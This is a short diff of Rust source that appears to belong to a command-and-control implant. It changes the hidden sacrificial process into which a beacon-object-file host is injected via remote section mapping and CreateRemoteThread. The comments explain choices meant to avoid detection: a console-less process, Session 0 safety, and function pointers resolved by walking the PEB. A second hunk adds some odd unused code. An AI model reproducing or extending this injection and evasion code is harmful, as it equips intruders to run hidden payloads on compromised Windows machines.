@@ -70,13 +70,14 @@ const ERR_OUTPUT_CAP: usize = 1024;
 /// response frame.
 const DRAIN_CAP: usize = 1 << 20;
 
-/// Sacrificial child image: `cmd.exe /c pause` — a plain console process
-/// that loads normally (kernel32 + loader fully initialized), then waits
-/// for input so the process stays alive while bof-host runs in it via
-/// CreateRemoteThread. Output goes to the inherited pipe, so no console
-/// window is created (OPSEC-clean); the /c pause keeps it alive until
-/// bof-host's ExitProcess tears it down.
-const SPAWN_TO: &str = "cmd.exe /c pause";
+/// Sacrificial child image: `cmd.exe /c ping -n 30 127.0.0.1 >nul` — a
+/// plain console process that loads normally (kernel32 + loader fully
+/// initialized), stays alive ~30 s without any console/input dependency
+/// (Session 0 safe), and writes nothing to the inherited stdout pipe
+/// (ping output goes to nul), so the pipe carries only bof-host's output.
+/// bof-host runs in it via CreateRemoteThread; its ExitProcess tears the
+/// child down, and the 30 s ping bounds a stalled blob.
+const SPAWN_TO: &str = "cmd.exe /c ping -n 30 127.0.0.1 >nul";
 
 // ---- Win32 fn-pointer types (PEB-walked per call, crate convention) ----
 
@@ -169,7 +170,8 @@ unsafe fn run_in_child(
     pipe_read: *mut c_void,
 ) -> Result<Response, &'static str> {
     let base = unsafe { crate::tp::section_deliver(proc.handle, image) }
-        .map_err(|_| "bof isolate: section delivery failed")?;
+        .map_err(|e| "bof isolate: section delivery failed")?;
+    let _ = base;
     let entry = base as usize; // blob entry at offset 0
     let arg = (base + BOF_HOST_BLOB.len()) as usize; // payload appended after the code
                                                      // Standard remote-thread injection: the child loads normally (kernel32 +
